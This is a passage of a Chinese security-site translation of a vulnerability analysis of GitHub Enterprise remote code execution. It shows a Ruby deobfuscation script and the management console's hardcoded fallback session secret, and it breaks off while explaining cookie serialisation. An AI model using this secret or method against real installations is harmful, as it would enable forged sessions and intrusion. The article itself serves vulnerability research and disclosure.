@@ -1,0 +1,763 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【漏洞分析】Github企业版远程代码执行漏洞分析 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="Github漏洞,Github企业版远程代码执行漏洞"/>
+    
+        <meta name="description" content="GitHub Enterprise为针对企业用户，可在企业内部架设Github的应用软件，本篇文章为针对其远程代码执行（RCE）漏洞的分析。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【漏洞分析】Github企业版远程代码执行漏洞分析</h2>
+                <div class="article-msg">
+                    <span class="time">2017-03-16 13:08:22</span>
+                    
+                                        <span class="read">阅读：12070次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3614"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3614" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="http://exablue.de/blog/2017-03-15-github-enterprise-remote-code-execution.html"
+                             target="_blank">来源： exablue</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2522399780" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2522399780" style="color:#848e99;">shan66</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;"><img src="http://p0.qhimg.com/t01fca6e9c231e322bc.png" title="t01fca6e9c231e322bc.png" alt="http://p0.qhimg.com/t01fca6e9c231e322bc.png"/></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">翻译：</span><a href="http://bobao.360.cn/member/contribute?uid=2522399780" target="_self" textvalue="shan66" style="text-decoration: none;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">shan66</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">预估稿费：170RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &#39;Hiragino Sans GB&#39;, &#39;Microsoft Yahei&#39;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-weight: 900; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px;">投稿方式：发送邮件至<a href="mailto:linwei@360.cn" target="_self" style="text-decoration: none; color: rgb(51, 51, 51); line-height: 28px;"><span style="color: rgb(0, 112, 192);">linwei#360.cn</span></a>，或登陆<a href="http://bobao.360.cn/contribute/index" target="_blank" style="text-decoration: none; color: rgb(0, 112, 192); line-height: 28px;">网页版</a>在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">前言</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">眼下，几乎人人都在使用GitHub。如果您有大量的绿皮书或者对自己的代码非常偏执，那么不妨运行自己的GitHub。支付$ 2500美元，就可以得到一个GitHub企业版，可供10个用户使用一年。实际上，Github企业版就是一个虚拟机，只不过提供了一个功能齐全的GitHub实例而已。尽管有一些边缘的情况下偶尔用到了GitHub.enterprise？调用，但是它运行的是与原始代码库一样的代码库。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">所以，让我们干掉它。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">代码的反混淆处理</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">当您下载Github企业版时，将会得到一个VirtualBox镜像，你可以将其部署到自己的机器上面。我通过启动随机恢复镜像考察机器的内部情况时，在/data目录里找到了GitHub的代码：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">data
+├──&nbsp;alambic
+├──&nbsp;babeld
+├──&nbsp;codeload
+├──&nbsp;db
+├──&nbsp;enterprise
+├──&nbsp;enterprise-manage
+├──&nbsp;failbotd
+├──&nbsp;git-hooks
+├──&nbsp;github
+├──&nbsp;git-import
+├──&nbsp;gitmon
+├──&nbsp;gpgverify
+├──&nbsp;hookshot
+├──&nbsp;lariat
+├──&nbsp;longpoll
+├──&nbsp;mail-replies
+├──&nbsp;pages
+├──&nbsp;pages-lua
+├──&nbsp;render
+├──&nbsp;slumlord
+└──&nbsp;user</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">不幸的是，这些代码是经过混淆处理的，大部分看起来像这样：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">require&nbsp;&quot;ruby_concealer&quot;
+__ruby_concealer__&nbsp;&quot;\xFF\xB3/\xDFH\x8A\xA7\xBF=U\xED\x91y\xDA\xDB\xA2qV&nbsp;&lt;more&nbsp;binary&nbsp;yada&nbsp;yada&gt;&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">原来，有一个名为ruby_concealer.so的ruby模块，会对二进制字符串执行Zlib :: Inflate :: inflate，然后利用密钥“This obfuscation is intended to discourage GitHub Enterprise customers from making modifications to the VM. We know this &#39;encryption&#39; is easily broken”进行XOR运算。就像密钥文字所提示的那样，这的确非常用以破解。现在，我们就通过以下工具对代码进行反混淆处理：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">#!/usr/bin/ruby
+#
+#&nbsp;This&nbsp;tool&nbsp;is&nbsp;only&nbsp;used&nbsp;to&nbsp;&quot;decrypt&quot;&nbsp;the&nbsp;github&nbsp;enterprise&nbsp;source&nbsp;code.
+#
+#&nbsp;Run&nbsp;in&nbsp;the&nbsp;/data&nbsp;directory&nbsp;of&nbsp;the&nbsp;instance.
+require&nbsp;&quot;zlib&quot;
+require&nbsp;&quot;byebug&quot;
+KEY&nbsp;=&nbsp;&quot;This&nbsp;obfuscation&nbsp;is&nbsp;intended&nbsp;to&nbsp;discourage&nbsp;GitHub&nbsp;Enterprise&nbsp;customers&nbsp;&quot;+
+&quot;from&nbsp;making&nbsp;modifications&nbsp;to&nbsp;the&nbsp;VM.&nbsp;We&nbsp;know&nbsp;this&nbsp;&#39;encryption&#39;&nbsp;is&nbsp;easily&nbsp;broken.&nbsp;&quot;
+class&nbsp;String
+&nbsp;&nbsp;def&nbsp;unescape
+&nbsp;&nbsp;&nbsp;&nbsp;buffer&nbsp;=&nbsp;[]
+&nbsp;&nbsp;&nbsp;&nbsp;mode&nbsp;=&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;tmp&nbsp;=&nbsp;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;https://github.com/ruby/ruby/blob/trunk/doc/syntax/literals.rdoc#strings
+&nbsp;&nbsp;&nbsp;&nbsp;sequences&nbsp;=&nbsp;{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;a&quot;&nbsp;&nbsp;=&gt;&nbsp;7,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;b&quot;&nbsp;&nbsp;=&gt;&nbsp;8,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;t&quot;&nbsp;&nbsp;=&gt;&nbsp;9,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;n&quot;&nbsp;&nbsp;=&gt;&nbsp;10,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;v&quot;&nbsp;&nbsp;=&gt;&nbsp;11,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;f&quot;&nbsp;&nbsp;=&gt;&nbsp;12,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;r&quot;&nbsp;&nbsp;=&gt;&nbsp;13,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;e&quot;&nbsp;&nbsp;=&gt;&nbsp;27,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;s&quot;&nbsp;&nbsp;=&gt;&nbsp;32,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\&quot;&quot;&nbsp;=&gt;&nbsp;34,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;#&quot;&nbsp;&nbsp;=&gt;&nbsp;35,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;\\&quot;&nbsp;=&gt;&nbsp;92,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;{&quot;&nbsp;&nbsp;=&gt;&nbsp;123,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;}&quot;&nbsp;&nbsp;=&gt;&nbsp;125,
+&nbsp;&nbsp;&nbsp;&nbsp;}
+&nbsp;&nbsp;&nbsp;&nbsp;self.chars.each&nbsp;do&nbsp;|c|
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;mode&nbsp;==&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;c&nbsp;==&nbsp;&quot;\\&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mode&nbsp;=&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp&nbsp;=&nbsp;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buffer&nbsp;&lt;&lt;&nbsp;c.ord
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp&nbsp;&lt;&lt;&nbsp;c
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;tmp[0]&nbsp;==&nbsp;&quot;x&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;tmp.length&nbsp;==&nbsp;3
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buffer&nbsp;&lt;&lt;&nbsp;tmp[1..2].hex
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mode&nbsp;=&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp&nbsp;=&nbsp;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;next
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;next
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;tmp.length&nbsp;==&nbsp;1&nbsp;&amp;&amp;&nbsp;sequences[tmp]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;buffer&nbsp;&lt;&lt;&nbsp;sequences[tmp]
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mode&nbsp;=&nbsp;0
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp&nbsp;=&nbsp;&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;next
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;raise&nbsp;&quot;Unknown&nbsp;sequences:&nbsp;\&quot;\\#{tmp}\&quot;&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;end
+&nbsp;&nbsp;&nbsp;&nbsp;end
+&nbsp;&nbsp;&nbsp;&nbsp;buffer.pack(&quot;C*&quot;)
+&nbsp;&nbsp;end
+&nbsp;&nbsp;def&nbsp;decrypt
+&nbsp;&nbsp;&nbsp;&nbsp;i,&nbsp;plaintext&nbsp;=&nbsp;0,&nbsp;&#39;&#39;
+&nbsp;&nbsp;&nbsp;&nbsp;Zlib::Inflate.inflate(self).each_byte&nbsp;do&nbsp;|c|
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plaintext&nbsp;&lt;&lt;&nbsp;(c&nbsp;^&nbsp;KEY[i%KEY.length].ord).chr
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;+=&nbsp;1
+&nbsp;&nbsp;&nbsp;&nbsp;end
+&nbsp;&nbsp;&nbsp;&nbsp;plaintext
+&nbsp;&nbsp;end
+end
+Dir.glob(&quot;**/*.rb&quot;).each&nbsp;do&nbsp;|file|
+&nbsp;&nbsp;header&nbsp;=&nbsp;&quot;require&nbsp;\&quot;ruby_concealer.so\&quot;\n__ruby_concealer__&nbsp;\&quot;&quot;
+&nbsp;&nbsp;len&nbsp;=&nbsp;header.length
+&nbsp;&nbsp;File.open(file,&nbsp;&quot;r+&quot;)&nbsp;do&nbsp;|fh|
+&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;fh.read(len)&nbsp;==&nbsp;header
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;puts&nbsp;file
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ciphertext&nbsp;=&nbsp;fh.read[0..-1].unescape
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;plaintext&nbsp;&nbsp;=&nbsp;ciphertext.decrypt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fh.truncate(0)
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fh.rewind
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fh.write(plaintext)
+&nbsp;&nbsp;&nbsp;&nbsp;end
+&nbsp;&nbsp;end
+end</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">企业管理接口</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">现在，我们已经得到了反混淆后的代码，自然就可以开始寻找漏洞了。我认为管理控制台将是一个不错的攻击目标。如果你是管理员，你可以添加SSH密钥（用于root权限）、关闭服务等。但对于普通权限的用户来说，其界面如下所示：&nbsp;</span></p><p style="text-align:center"><img src="http://p7.qhimg.com/t017e4a739c36209d30.png" title="t01b45686c2f15be129.png" alt="http://p6.qhimg.com/t01b45686c2f15be129.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">毫不奇怪，代码可以从/data/enterprise-manager/current /中找到。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">会话管理</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">由于管理接口是一个Rack应用程序，所以首先要做的事情就是查看config.ru文件，以便进一步了解这个应用程序的架构详情，我注意到它使用了Rack :: Session :: Cookie。就像您从名称中可以猜到的那样，这是一个将会话数据转储到cookie的Rack中间件。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">#&nbsp;Enable&nbsp;sessions
+use&nbsp;Rack::Session::Cookie,
+&nbsp;&nbsp;:key&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&quot;_gh_manage&quot;,
+&nbsp;&nbsp;:path&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;&quot;/&quot;,
+&nbsp;&nbsp;:expire_after&nbsp;=&gt;&nbsp;1800,&nbsp;#&nbsp;30&nbsp;minutes&nbsp;in&nbsp;seconds
+&nbsp;&nbsp;:secret&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&gt;&nbsp;ENV[&quot;ENTERPRISE_SESSION_SECRET&quot;]&nbsp;||&nbsp;&quot;641dd6454584ddabfed6342cc66281fb&quot;</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">实际上，它在内部完成的工作只有一件，那就是：</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">将会话数据序列化为cookie</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当这个Rack应用程序完成时，Rack :: Session :: Cookie将使用下面展示的算法将会话数据保存到Cookie中：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">取得应用程序放在env [“rack.session”]的会话哈希值（{“user_id”=&gt; 1234，“admin”=&gt; true}或类似的东西）</span></p><p style="text-indent: 2em; text-align: left;"><span 